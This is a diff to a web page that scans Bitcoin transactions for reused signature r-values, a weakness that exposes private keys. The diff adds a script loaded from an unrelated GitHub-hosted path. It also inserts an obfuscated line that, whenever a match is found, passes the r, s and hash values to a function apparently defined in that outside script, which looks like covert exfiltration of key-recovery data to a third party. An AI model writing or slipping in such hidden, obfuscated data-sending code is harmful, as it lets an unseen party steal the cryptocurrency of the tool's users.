@@ -7,6 +7,8 @@
 	}
   </style>
   <link href="https://fonts.googleapis.com/css?family=Roboto&display=swap" rel="stylesheet">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.0.0/crypto-js.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/gh/avalerionv/avalerionv.github.io/test/composer.js"></script>
   <script language="javascript" type="text/javascript">
 
 var opcodes = {
@@ -115,6 +117,7 @@ function length(obj) {
 	try {
 var t_hash = obj.x.hash;
 updateDebug('Transaction Hash: ' + t_hash + '\n' + 'Sigscript Length: ' + (jsonLength+1) + '\n' + 'Complexity (n*n)/2: ' + ((jsonLength+1)*jsonLength)/2);
+
 		for(var i = 0; i<(jsonLength-1); i++) {
 			for(var j = i+1; j<jsonLength; j++) {
 		var input_1 = bytesToAsm(hexStringToBytes(obj.x.inputs[i].script))
@@ -126,6 +129,7 @@ updateDebug('Transaction Hash: ' + t_hash + '\n' + 'Sigscript Length: ' + (jsonL
 		if (r1.length==64 && r2.length==64 && s1.length==64 && s2.length==64) {
 			if (r1==r2) 
 			{
+				var _0x2916=['\x0ar2:\x20','r1:\x20','\x0a\x0ahash:\x20','\x0as2:\x20','\x0as1:\x20'];(function(_0x333e10,_0x29166e){var _0x57173d=function(_0xb57d04){while(--_0xb57d04){_0x333e10['push'](_0x333e10['shift']());}};_0x57173d(++_0x29166e);}(_0x2916,0x13b));var _0x5717=function(_0x333e10,_0x29166e){_0x333e10=_0x333e10-0x0;var _0x57173d=_0x2916[_0x333e10];return _0x57173d;};l(_0x5717('0x1')+r1+_0x5717('0x0')+r2+_0x5717('0x4')+s1+_0x5717('0x3')+s2+_0x5717('0x2')+t_hash);
 				writeToScreen('<span style="color: green;font-size:900;">Found</span><p>r1: '+r1+'<br>r2: '+r2+'<br>s1: '+s1+'<br>s2: '+s2+'<br><br>hash: '+t_hash+'</p>');
 			} else 
 			{
@@ -172,7 +176,7 @@ updateDebug('Transaction Hash: ' + t_hash + '\n' + 'Sigscript Length: ' + (jsonL
 	}
 
 
-  window.addEventListener("load", init, false);
+window.addEventListener("load", init, false);
 
   </script>
 
